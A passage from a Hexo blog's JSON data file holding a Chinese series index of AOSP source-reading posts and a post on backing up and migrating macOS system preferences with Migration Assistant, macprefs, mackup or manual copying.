[源码茶舍之由一次简单的ANR分析深入了解Context](https://blog.ysy950803.top/2019/02/23/源码茶舍之由一次简单的ANR分析深入了解Context/)\n","source":"_posts/2021-01-28-源码茶舍：App进程创建中的poll机制.md","raw":"---\nlayout:     post\ntitle:      源码茶舍：App进程创建中的poll机制\nsubtitle:   深入研究。\ndate:       2021-01-28\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - Android\n    - AOSP\n---\n\n挖坑待填，未完待续……\n\n## 系列汇总\n\n转眼间几年过去了，“源码茶舍”也算是我写的第一个系列文章，最初取这个名字的意思便是“像喝茶一样品味AOSP源码”，喝茶讲究什么？当然是悠闲。因此，此系列的文章一般都不长，且大多数都是我平时偶尔遇见的问题或者趣点，总之是比较随意的，研究深度是在我能力范围内尽可能深入。\n\n希望以后还能一如既往地更新这个系列，疏漏错误之处还请大家指点。至此汇总一下往期所有：\n\n- [源码茶舍之没有epoll就没有Handler](https://blog.ysy950803.top/2020/11/18/源码茶舍之没有epoll就没有Handler/)\n- [源码茶舍之如何由Uri找寻ContentProvider](https://blog.ysy950803.top/2020/01/29/源码茶舍之如何由Uri找寻ContentProvider/)\n- [源码茶舍之FLAG_EXCLUDE_STOPPED_PACKAGES与广播唤醒](https://blog.ysy950803.top/2020/01/21/源码茶舍之FLAG_EXCLUDE_STOPPED_PACKAGES与广播唤醒/)\n- [源码茶舍之PackageManager获取注册Service数量问题](https://blog.ysy950803.top/2019/11/02/源码茶舍之PackageManager获取注册Service数量问题/)\n- [源码茶舍之android:externalService是什么属性？实现原理？](https://blog.ysy950803.top/2019/04/10/源码茶舍之android-externalService是什么属性-实现原理/)\n- [源码茶舍之由一次简单的ANR分析深入了解Context](https://blog.ysy950803.top/2019/02/23/源码茶舍之由一次简单的ANR分析深入了解Context/)\n","slug":"源码茶舍：App进程创建中的poll机制","published":1,"updated":"2024-03-25T07:31:25.865Z","comments":1,"photos":[],"link":"","_id":"cluaufh18003ithe6e0gghp62","content":"<p>挖坑待填，未完待续……</p>\n<h2 id=\"系列汇总\"><a href=\"#系列汇总\" class=\"headerlink\" title=\"系列汇总\"></a>系列汇总</h2><p>转眼间几年过去了，“源码茶舍”也算是我写的第一个系列文章，最初取这个名字的意思便是“像喝茶一样品味AOSP源码”，喝茶讲究什么？当然是悠闲。因此，此系列的文章一般都不长，且大多数都是我平时偶尔遇见的问题或者趣点，总之是比较随意的，研究深度是在我能力范围内尽可能深入。</p>\n<p>希望以后还能一如既往地更新这个系列，疏漏错误之处还请大家指点。至此汇总一下往期所有：</p>\n<ul>\n<li><a href=\"https://blog.ysy950803.top/2020/11/18/%E6%BA%90%E7%A0%81%E8%8C%B6%E8%88%8D%E4%B9%8B%E6%B2%A1%E6%9C%89epoll%E5%B0%B1%E6%B2%A1%E6%9C%89Handler/\">源码茶舍之没有epoll就没有Handler</a></li>\n<li><a href=\"https://blog.ysy950803.top/2020/01/29/%E6%BA%90%E7%A0%81%E8%8C%B6%E8%88%8D%E4%B9%8B%E5%A6%82%E4%BD%95%E7%94%B1Uri%E6%89%BE%E5%AF%BBContentProvider/\">源码茶舍之如何由Uri找寻ContentProvider</a></li>\n<li><a href=\"https://blog.ysy950803.top/2020/01/21/%E6%BA%90%E7%A0%81%E8%8C%B6%E8%88%8D%E4%B9%8BFLAG_EXCLUDE_STOPPED_PACKAGES%E4%B8%8E%E5%B9%BF%E6%92%AD%E5%94%A4%E9%86%92/\">源码茶舍之FLAG_EXCLUDE_STOPPED_PACKAGES与广播唤醒</a></li>\n<li><a href=\"https://blog.ysy950803.top/2019/11/02/%E6%BA%90%E7%A0%81%E8%8C%B6%E8%88%8D%E4%B9%8BPackageManager%E8%8E%B7%E5%8F%96%E6%B3%A8%E5%86%8CService%E6%95%B0%E9%87%8F%E9%97%AE%E9%A2%98/\">源码茶舍之PackageManager获取注册Service数量问题</a></li>\n<li><a href=\"https://blog.ysy950803.top/2019/04/10/%E6%BA%90%E7%A0%81%E8%8C%B6%E8%88%8D%E4%B9%8Bandroid-externalService%E6%98%AF%E4%BB%80%E4%B9%88%E5%B1%9E%E6%80%A7-%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/\">源码茶舍之android:externalService是什么属性？实现原理？</a></li>\n<li><a href=\"https://blog.ysy950803.top/2019/02/23/%E6%BA%90%E7%A0%81%E8%8C%B6%E8%88%8D%E4%B9%8B%E7%94%B1%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84ANR%E5%88%86%E6%9E%90%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Context/\">源码茶舍之由一次简单的ANR分析深入了解Context</a></li>\n</ul>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<p>挖坑待填，未完待续……</p>\n<h2 id=\"系列汇总\"><a href=\"#系列汇总\" class=\"headerlink\" title=\"系列汇总\"></a>系列汇总</h2><p>转眼间几年过去了，“源码茶舍”也算是我写的第一个系列文章，最初取这个名字的意思便是“像喝茶一样品味AOSP源码”，喝茶讲究什么？当然是悠闲。因此，此系列的文章一般都不长，且大多数都是我平时偶尔遇见的问题或者趣点，总之是比较随意的，研究深度是在我能力范围内尽可能深入。</p>\n<p>希望以后还能一如既往地更新这个系列，疏漏错误之处还请大家指点。至此汇总一下往期所有：</p>\n<ul>\n<li><a href=\"https://blog.ysy950803.top/2020/11/18/%E6%BA%90%E7%A0%81%E8%8C%B6%E8%88%8D%E4%B9%8B%E6%B2%A1%E6%9C%89epoll%E5%B0%B1%E6%B2%A1%E6%9C%89Handler/\">源码茶舍之没有epoll就没有Handler</a></li>\n<li><a href=\"https://blog.ysy950803.top/2020/01/29/%E6%BA%90%E7%A0%81%E8%8C%B6%E8%88%8D%E4%B9%8B%E5%A6%82%E4%BD%95%E7%94%B1Uri%E6%89%BE%E5%AF%BBContentProvider/\">源码茶舍之如何由Uri找寻ContentProvider</a></li>\n<li><a href=\"https://blog.ysy950803.top/2020/01/21/%E6%BA%90%E7%A0%81%E8%8C%B6%E8%88%8D%E4%B9%8BFLAG_EXCLUDE_STOPPED_PACKAGES%E4%B8%8E%E5%B9%BF%E6%92%AD%E5%94%A4%E9%86%92/\">源码茶舍之FLAG_EXCLUDE_STOPPED_PACKAGES与广播唤醒</a></li>\n<li><a href=\"https://blog.ysy950803.top/2019/11/02/%E6%BA%90%E7%A0%81%E8%8C%B6%E8%88%8D%E4%B9%8BPackageManager%E8%8E%B7%E5%8F%96%E6%B3%A8%E5%86%8CService%E6%95%B0%E9%87%8F%E9%97%AE%E9%A2%98/\">源码茶舍之PackageManager获取注册Service数量问题</a></li>\n<li><a href=\"https://blog.ysy950803.top/2019/04/10/%E6%BA%90%E7%A0%81%E8%8C%B6%E8%88%8D%E4%B9%8Bandroid-externalService%E6%98%AF%E4%BB%80%E4%B9%88%E5%B1%9E%E6%80%A7-%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/\">源码茶舍之android:externalService是什么属性？实现原理？</a></li>\n<li><a href=\"https://blog.ysy950803.top/2019/02/23/%E6%BA%90%E7%A0%81%E8%8C%B6%E8%88%8D%E4%B9%8B%E7%94%B1%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84ANR%E5%88%86%E6%9E%90%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Context/\">源码茶舍之由一次简单的ANR分析深入了解Context</a></li>\n</ul>\n"},{"layout":"post","title":"macOS备份迁移系统偏好设置","subtitle":"指条明路。","date":"2021-02-22T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\n## 场景\n\n不知道诸位在使用macOS时是否遇到过这样的场景：有两台电脑，想把旧电脑中的系统偏好设置原封不动地迁移（导入）到新电脑中，只关心这些设置，不想迁移其他东西。\n\n## 解决\n\n### 方案1：官方迁移助理\n\n其实官方提供了一个方案，叫“迁移助理”。具体操作步骤可见文档：[将内容迁移到一台新的 Mac 上](https://support.apple.com/zh-cn/HT204350)，不仅可以迁移系统设置，还包括整个用户帐户下的文件、应用程序等。\n\n![](https://support.apple.com/library/content/dam/edam/applecare/images/zh_CN/macos/Big-Sur/macos-big-sur-migration-assistant-select-info-to-transfer.jpg)\n\n如图，我们可以在此步骤中只选择“系统与网络”，就能实现系统设置的迁移。\n\n### 方案2：macprefs\n\n第一个方案其实是比较安全保险的做法，但是需要注意的是：\n\n> 在这个示例中，John Appleseed 是一个 macOS 用户帐户。如果这个帐户与新 Mac 上已有的帐户同名，则系统会提示您重命名这个旧帐户或替换新 Mac 上的帐户。如果进行重命名，则这个旧帐户会作为单独的用户出现在新 Mac 上，并且拥有单独的个人文件夹和登录名。如果进行替换，则这个旧帐户会删除并随后替换新 Mac 上的帐户，包括相应个人文件夹中的所有内容。\n\n也就是说你可以选择覆盖或者创建另一个帐户来迁移你的数据。其实很多时候，我们只是想把系统偏好设置做一个导出导入仅此而已，并不想涉及帐户相关的操作。又比如说我想把我的设置分享给其他朋友，或者备份到我自己的硬盘or云端。这个时候，就需要借助开源的力量了。\n\n[macprefs](https://github.com/clintmod/macprefs)：Backup and Restore your Mac System and App Preferences (e.g. defaults write)\n\n这个开源项目的About写得非常清楚，就是可以备份和恢复macOS的系统设置。安装和使用也非常方便：\n\n```bash\nbrew install clintmod/formulas/macprefs\n```\n\n打开终端，一行命令安装。没有安装brew？官网在这里：[https://brew.sh/](https://brew.sh/)\n\n备份和恢复命令：\n\n```bash\nmacprefs backup\n# 备份成功之后，文件默认在~/Dropbox/MacPrefsBackup目录中\nmacprefs restore\n```\n\n当然，也可以修改默认备份目录：\n\n```bash\nexport MACPREFS_BACKUP_DIR=\"$HOME/SomeOtherDir\"\n```\n\n所以，我们就可以在旧电脑上备份后，把文件copy到新电脑上，再进行恢复。显然前提是两边都安装了macprefs。这里需要注意的是，最好保证两边的帐户用户名是一致的，否则可能出现奇怪的问题（含泪亲测）。\n\n### 方案3：mackup\n\n这个开源项目的简介：Keep your application settings in sync (OS X/Linux)\n\n与方案2的区别在于，它直接把系统设置备份到了云端，需要先安装好[Dropbox](https://www.dropbox.com/)，相当于省去了手动copy文件到另一台电脑的操作。然后再安装此工具：\n\n```bash\nbrew install mackup\n```\n\n备份和恢复命令：\n\n```bash\nmackup backup\nmackup restore\n```\n\n相比macprefs还有个优势是，它可以撤销恢复操作：\n\n```bash\nmackup uninstall\n```\n\n也就是说如果我restore后发现有问题，比如出现奇怪的bug之类的，那么我可以撤销到原有的设置，给人很安心的感觉。除此之外，mackup不仅支持macOS，也支持Ubuntu等其他Linux发行版系统。\n\n### 方案4：纯手动档\n\n其实经过探索发现后，我们知道macOS会把用户的一些App设置存储在这里：`/Users/xxx/Library/Preferences`，会把系统相关的设置存储在这里：`/Library/Preferences`。\n\n其实上述的开源工具大致上也是备份了这些文件，从macprefs的部分源码可以得知：\n\n```python\ndef get_preferences_dir():\n    return_val = path.join(get_home_dir(), 'Library/Preferences/')\n    return return_val\n```\n\n理论上讲，我们手动把这些文件夹copy过去也可以。这个我没有亲测过，毕竟实际操作粒度可能不会这么粗，感兴趣的小伙伴可以折腾试验一下。\n\n## 后话\n\n之前还有人提到过直接Time Machine进行备份和恢复之类的办法，这未免有些大动干戈了。我只是想迁移系统偏好设置而已，尤其是触控板、鼠标、键盘等设置的微调，每次换电脑都要重新弄一遍很麻烦的。也但愿官方有更简单的办法来导出这些配置文件，毕竟开源工具更新不及时，也很可能出问题的。\n","source":"_posts/2021-02-23-macOS备份迁移系统偏好设置.md","raw":"---\nlayout:     post\ntitle:      macOS备份迁移系统偏好设置\nsubtitle:   指条明路。\ndate:       2021-02-23\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - 鼓捣折腾\n    - macOS\n---\n\n## 场景\n\n不知道诸位在使用macOS时是否遇到过这样的场景：有两台电脑，想把旧电脑中的系统偏好设置原封不动地迁移（导入）到新电脑中，只关心这些设置，不想迁移其他东西。\n\n## 解决\n\n### 方案1：官方迁移助理\n\n其实官方提供了一个方案，叫“迁移助理”。具体操作步骤可见文档：[将内容迁移到一台新的 Mac 上](https://support.apple.com/zh-cn/HT204350)，不仅可以迁移系统设置，还包括整个用户帐户下的文件、应用程序等。\n\n![](https://support.apple.com/library/content/dam/edam/applecare/images/zh_CN/macos/Big-Sur/macos-big-sur-migration-assistant-select-info-to-transfer.jpg)\n\n如图，我们可以在此步骤中只选择“系统与网络”，就能实现系统设置的迁移。\n\n### 方案2：macprefs\n\n第一个方案其实是比较安全保险的做法，但是需要注意的是：\n\n> 在这个示例中，John Appleseed 是一个 macOS 用户帐户。如果这个帐户与新 Mac 上已有的帐户同名，则系统会提示您重命名这个旧帐户或替换新 Mac 上的帐户。如果进行重命名，则这个旧帐户会作为单独的用户出现在新 Mac 上，并且拥有单独的个人文件夹和登录名。如果进行替换，则这个旧帐户会删除并随后替换新 Mac 上的帐户，包括相应个人文件夹中的所有内容。\n\n也就是说你可以选择覆盖或者创建另一个帐户来迁移你的数据。其实很多时候，我们只是想把系统偏好设置做一个导出导入仅此而已，并不想涉及帐户相关的操作。又比如说我想把我的设置分享给其他朋友，或者备份到我自己的硬盘or云端。这个时候，就需要借助开源的力量了。\n\n[macprefs](https://github.com/clintmod/macprefs)：Backup and Restore your Mac System and App Preferences (e.g. defaults write)\n\n这个开源项目的About写得非常清楚，就是可以备份和恢复macOS的系统设置。安装和使用也非常方便：\n\n```bash\nbrew install clintmod/formulas/macprefs\n```\n\n打开终端，一行命令安装。没有安装brew？官网在这里：[https://brew.sh/](https://brew.sh/)\n\n备份和恢复命令：\n\n```bash\nmacprefs backup\n# 备份成功之后，文件默认在~/Dropbox/MacPrefsBackup目录中\nmacprefs restore\n```\n\n当然，也可以修改默认备份目录：\n\n```bash\nexport MACPREFS_BACKUP_DIR=\"$HOME/SomeOtherDir\"\n```\n\n所以，我们就可以在旧电脑上备份后，把文件copy到新电脑上，再进行恢复。显然前提是两边都安装了macprefs。这里需要注意的是，最好保证两边的帐户用户名是一致的，否则可能出现奇怪的问题（含泪亲测）。\n\n### 方案3：mackup\n\n这个开源项目的简介：Keep your application settings in sync (OS X/Linux)\n\n与方案2的区别在于，它直接把系统设置备份到了云端，需要先安装好[Dropbox](https://www.dropbox.com/)，相当于省去了手动copy文件到另一台电脑的操作。然后再安装此工具：\n\n```bash\nbrew install mackup\n```\n\n备份和恢复命令：\n\n```bash\nmackup backup\nmackup restore\n```\n\n相比macprefs还有个优势是，它可以撤销恢复操作：\n\n```bash\nmackup uninstall\n```\n\n也就是说如果我restore后发现有问题，比如出现奇怪的bug之类的，那么我可以撤销到原有的设置，给人很安心的感觉。除此之外，mackup不仅支持macOS，也支持Ubuntu等其他Linux发行版系统。\n\n### 方案4：纯手动档\n\n其实经过探索发现后，我们知道macOS会把用户的一些App设置存储在这里：`/Users/xxx/Library/Preferences`，会把系统相关的设置存储在这里：`/Library/Preferences`。\n\n其实上述的开源工具大致上也是备份了这些文件，从macprefs的部分源码可以得知：\n\n```python\ndef get_preferences_dir():\n    return_val = path.join(get_home_dir(), 'Library/Preferences/')\n    return return_val\n```\n\n理论上讲，我们手动把这些文件夹copy过去也可以。这个我没有亲测过，毕竟实际操作粒度可能不会这么粗，感兴趣的小伙伴可以折腾试验一下。\n\n## 后话\n\n之前还有人提到过直接Time Machine进行备份和恢复之类的办法，这未免有些大动干戈了。我只是想迁移系统偏好设置而已，尤其是触控板、鼠标、键盘等设置的微调，每次换电脑都要重新弄一遍很麻烦的。也但愿官方有更简单的办法来导出这些配置文件，毕竟开源工具更新不及时，也很可能出问题的。\n","slug":"macOS备份迁移系统偏好设置","published":1,"updated":"2024-03-25T07:31:25.865Z","comments":1,"photos":[],"link":"","_id":"cluaufh18003kthe63dwbg8bc","content":"<h2 id=\"场景\"><a href=\"#场景\" class=\"headerlink\" title=\"场景\"></a>场景</h2><p>不知道诸位在使用macOS时是否遇到过这样的场景：有两台电脑，想把旧电脑中的系统偏好设置原封不动地迁移（导入）到新电脑中，只关心这些设置，不想迁移其他东西。</p>\n<h2 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h2><h3 id=\"方案1：官方迁移助理\"><a href=\"#方案1：官方迁移助理\" class=\"headerlink\" title=\"方案1：官方迁移助理\"></a>方案1：官方迁移助理</h3><p>其实官方提供了一个方案，叫“迁移助理”。具体操作步骤可见文档：<a href=\"https://support.apple.com/zh-cn/HT204350\">将内容迁移到一台新的 Mac 上</a>，不仅可以迁移系统设置，还包括整个用户帐户下的文件、应用程序等。</p>\n<p><img src=\"https://support.apple.com/library/content/dam/edam/applecare/images/zh_CN/macos/Big-Sur/macos-big-sur-migration-assistant-select-info-to-transfer.jpg\"></p>\n<p>如图，我们可以在此步骤中只选择“系统与网络”，就能实现系统设置的迁移。</p>\n<h3 id=\"方案2：macprefs\"><a href=\"#方案2：macprefs\" class=\"headerlink\" title=\"方案2：macprefs\"></a>方案2：macprefs</h3><p>第一个方案其实是比较安全保险的做法，但是需要注意的是：</p>\n<blockquote>\n<p>在这个示例中，John Appleseed 是一个 macOS 用户帐户。如果这个帐户与新 Mac 上已有的帐户同名，则系统会提示您重命名这个旧帐户或替换新 Mac 上的帐户。如果进行重命名，则这个旧帐户会作为单独的用户出现在新 Mac 上，并且拥有单独的个人文件夹和登录名。如果进行替换，则这个旧帐户会删除并随后替换新 Mac 上的帐户，包括相应个人文件夹中的所有内容。</p>\n</blockquote>\n<p>也就是说你可以选择覆盖或者创建另一个帐户来迁移你的数据。其实很多时候，我们只是想把系统偏好设置做一个导出导入仅此而已，并不想涉及帐户相关的操作。又比如说我想把我的设置分享给其他朋友，或者备份到我自己的硬盘or云端。这个时候，就需要借助开源的力量了。</p>\n<p><a href=\"https://github.com/clintmod/macprefs\">macprefs</a>：Backup and Restore your Mac System and App Preferences (e.g. defaults write)</p>\n<p>这个开源项目的About写得非常清楚，就是可以备份和恢复macOS的系统设置。安装和使用也非常方便：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">brew install clintmod/formulas/macprefs</span><br></pre></td></tr></table></figure>\n\n<p>打开终端，一行命令安装。没有安装brew？官网在这里：<a href=\"https://brew.sh/\">https://brew.sh/</a></p>\n<p>备份和恢复命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">macprefs backup</span><br><span class=\"line\"><span class=\"comment\"># 备份成功之后，文件默认在~/Dropbox/MacPrefsBackup目录中</span></span><br><span class=\"line\">macprefs restore</span><br></pre></td></tr></table></figure>\n\n<p>当然，也可以修改默认备份目录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">export</span> MACPREFS_BACKUP_DIR=<span class=\"string\">&quot;<span class=\"variable\">$HOME</span>/SomeOtherDir&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>所以，我们就可以在旧电脑上备份后，把文件copy到新电脑上，再进行恢复。显然前提是两边都安装了macprefs。这里需要注意的是，最好保证两边的帐户用户名是一致的，否则可能出现奇怪的问题（含泪亲测）。</p>\n<h3 id=\"方案3：mackup\"><a href=\"#方案3：mackup\" class=\"headerlink\" title=\"方案3：mackup\"></a>方案3：mackup</h3><p>这个开源项目的简介：Keep your application settings in sync (OS X&#x2F;Linux)</p>\n<p>与方案2的区别在于，它直接把系统设置备份到了云端，需要先安装好<a href=\"https://www.dropbox.com/\">Dropbox</a>，相当于省去了手动copy文件到另一台电脑的操作。然后再安装此工具：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">brew install mackup</span><br></pre></td></tr></table></figure>\n\n<p>备份和恢复命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mackup backup</span><br><span class=\"line\">mackup restore</span><br></pre></td></tr></table></figure>\n\n<p>相比macprefs还有个优势是，它可以撤销恢复操作：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mackup uninstall</span><br></pre></td></tr></table></figure>\n\n<p>也就是说如果我restore后发现有问题，比如出现奇怪的bug之类的，那么我可以撤销到原有的设置，给人很安心的感觉。除此之外，mackup不仅支持macOS，也支持Ubuntu等其他Linux发行版系统。</p>\n<h3 id=\"方案4：纯手动档\"><a href=\"#方案4：纯手动档\" class=\"headerlink\" title=\"方案4：纯手动档\"></a>方案4：纯手动档</h3><p>其实经过探索发现后，我们知道macOS会把用户的一些App设置存储在这里：<code>/Users/xxx/Library/Preferences</code>，会把系统相关的设置存储在这里：<code>/Library/Preferences</code>。</p>\n<p>其实上述的开源工具大致上也是备份了这些文件，从macprefs的部分源码可以得知：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_preferences_dir</span>():</span><br><span class=\"line\">    return_val = path.join(get_home_dir(), <span class=\"string\">&#x27;Library/Preferences/&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> return_val</span><br></pre></td></tr></table></figure>\n\n<p>理论上讲，我们手动把这些文件夹copy过去也可以。这个我没有亲测过，毕竟实际操作粒度可能不会这么粗，感兴趣的小伙伴可以折腾试验一下。</p>\n<h2 id=\"后话\"><a href=\"#后话\" class=\"headerlink\" title=\"后话\"></a>后话</h2><p>之前还有人提到过直接Time Machine进行备份和恢复之类的办法，这未免有些大动干戈了。我只是想迁移系统偏好设置而已，尤其是触控板、鼠标、键盘等设置的微调，每次换电脑都要重新弄一遍很麻烦的。也但愿官方有更简单的办法来导出这些配置文件，毕竟开源工具更新不及时，也很可能出问题的。</p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<h2 id=\"场景\"><a href=\"#场景\" class=\"headerlink\" title=\"场景\"></a>场景</h2><p>不知道诸位在使用macOS时是否遇到过这样的场景：有两台电脑，想把旧电脑中的系统偏好设置原封不动地迁移（导入）到新电脑中，只关心这些设置，不想迁移其他东西。</p>\n<h2 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h2><h3 id=\"方案1：官方迁移助理\"><a href=\"#方案1：官方迁移助理\" class=\"headerlink\" title=\"方案1：官方迁移助理\"></a>方案1：官方迁移助理</h3><p>其实官方提供了一个方案，叫“迁移助理”。具体操作步骤可见文档：<a href=\"https://support.apple.com/zh-cn/HT204350\">将内容迁移到一台新的 Mac 上</a>，不仅可以迁移系统设置，还包括整个用户帐户下的文件、应用程序等。</p>\n<p><img src=\"https://support.apple.com/library/content/dam/edam/applecare/images/zh_CN/macos/Big-Sur/macos-big-sur-migration-assistant-select-info-to-transfer.jpg\"></p>\n<p>如图，我们可以在此步骤中只选择“系统与网络”，就能实现系统设置的迁移。</p>\n<h3 id=\"方案2：macprefs\"><a href=\"#方案2：macprefs\" class=\"headerlink\" title=\"方案2：macprefs\"></a>方案2：macprefs</h3><p>第一个方案其实是比较安全保险的做法，但是需要注意的是：</p>\n<blockquote>\n<p>在这个示例中，John Appleseed 是一个 macOS 用户帐户。如果这个帐户与新 Mac 上已有的帐户同名，则系统会提示您重命名这个旧帐户或替换新 Mac 上的帐户。如果进行重命名，则这个旧帐户会作为单独的用户出现在新 Mac 上，并且拥有单独的个人文件夹和登录名。如果进行替换，则这个旧帐户会删除并随后替换新 Mac 上的帐户，包括相应个人文件夹中的所有内容。</p>\n</blockquote>\n<p>也就是说你可以选择覆盖或者创建另一个帐户来迁移你的数据。其实很多时候，我们只是想把系统偏好设置做一个导出导入仅此而已，并不想涉及帐户相关的操作。又比如说我想把我的设置分享给其他朋友，或者备份到我自己的硬盘or云端。这个时候，就需要借助开源的力量了。</p>\n<p><a href=\"https://github.com/clintmod/macprefs\">macprefs</a>：Backup and Restore your Mac System and App Preferences (e.g. defaults write)</p>\n<p>这个开源项目的About写得非常清楚，就是可以备份和恢复macOS的系统设置。安装和使用也非常方便：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">brew install clintmod/formulas/macprefs</span><br></pre></td></tr></table></figure>\n\n<p>打开终端，一行命令安装。没有安装brew？官网在这里：<a href=\"https://brew.sh/\">https://brew.sh/</a></p>\n<p>备份和恢复命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">macprefs backup</span><br><span class=\"line\"><span class=\"comment\"># 备份成功之后，文件默认在~/Dropbox/MacPrefsBackup目录中</span></span><br><span class=\"line\">macprefs restore</span><br></pre></td></tr></table></figure>\n\n<p>当然，也可以修改默认备份目录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">export</span> MACPREFS_BACKUP_DIR=<span class=\"string\">&quot;<span class=\"variable\">$HOME</span>/SomeOtherDir&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>所以，我们就可以在旧电脑上备份后，把文件copy到新电脑上，再进行恢复。显然前提是两边都安装了macprefs。这里需要注意的是，最好保证两边的帐户用户名是一致的，否则可能出现奇怪的问题（含泪亲测）。</p>\n<h3 id=\"方案3：mackup\"><a href=\"#方案3：mackup\" class=\"headerlink\" title=\"方案3：mackup\"></a>方案3：mackup</h3><p>这个开源项目的简介：Keep your application settings in sync (OS X&#x2F;Linux)</p>\n<p>与方案2的区别在于，它直接把系统设置备份到了云端，需要先安装好<a href=\"https://www.dropbox.com/\">Dropbox</a>，相当于省去了手动copy文件到另一台电脑的操作。然后再安装此工具：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">brew install mackup</span><br></pre></td></tr></table></figure>\n\n<p>备份和恢复命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mackup backup</span><br><span class=\"line\">mackup restore</span><br></pre></td></tr></table></figure>\n\n<p>相比macprefs还有个优势是，它可以撤销恢复操作：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mackup uninstall</span><br></pre></td></tr></table></figure>\n\n<p>也就是说如果我restore后发现有问题，比如出现奇怪的bug之类的，那么我可以撤销到原有的设置，给人很安心的感觉。除此之外，mackup不仅支持macOS，也支持Ubuntu等其他Linux发行版系统。</p>\n<h3 id=\"方案4：纯手动档\"><a href=\"#方案4：纯手动档\" class=\"headerlink\" title=\"方案4：纯手动档\"></a>方案4：纯手动档</h3><p>其实经过探索发现后，我们知道macOS会把用户的一些App设置存储在这里：<code>/Users/xxx/Library/Preferences</code>，会把系统相关的设置存储在这里：<code>/Library/Preferences</code>。</p>\n<p>其实上述的开源工具大致上也是备份了这些文件，从macprefs的部分源码可以得知：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_preferences_dir</span>():</span><br><span class=\"line\">    return_val = path.join(get_home_dir(), <span class=\"string\">&#x27;Library/Preferences/&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> return_val</span><br></pre></td></tr></table></figure>\n\n<p>理论上讲，我们手动把这些文件夹copy过去也可以。这个我没有亲测过，毕竟实际操作粒度可能不会这么粗，感兴趣的小伙伴可以折腾试验一下。</p>\n<h2 id=\"后话\"><a href=\"#后话\" class=\"headerlink\" title=\"后话\"></a>后话</h2><p>之前还有人提到过直接Time 